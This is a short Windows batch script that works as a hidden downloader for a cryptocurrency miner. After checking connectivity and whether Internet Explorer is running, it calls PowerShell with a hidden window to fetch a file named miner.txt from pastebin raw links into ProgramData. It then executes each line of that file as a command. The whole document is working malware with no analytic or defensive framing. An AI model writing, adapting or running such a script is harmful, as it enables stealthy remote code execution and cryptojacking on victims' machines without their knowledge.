@echo off
Ping google.com -n 1 -w 1000
if errorlevel 1 exit
tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "iexplore.exe">NUL && if "%ERRORLEVEL%"=="0" exit
reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
if %OS%==32BIT powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile( 'https://pastebin.com/raw/Y21uLxue', '%HOMEDRIVE%\ProgramData\miner.txt' )
if %OS%==64BIT powershell.exe -nop -w hidden -c (New-Object System.Net.WebClient).DownloadFile( 'https://pastebin.com/raw/B66spZ7X', '%HOMEDRIVE%\ProgramData\miner.txt' )
timeout 5
for /F "eol=; tokens=1* delims=" %%i in ( C:\ProgramData\miner.txt ) do call :run %%i 
:run
%*
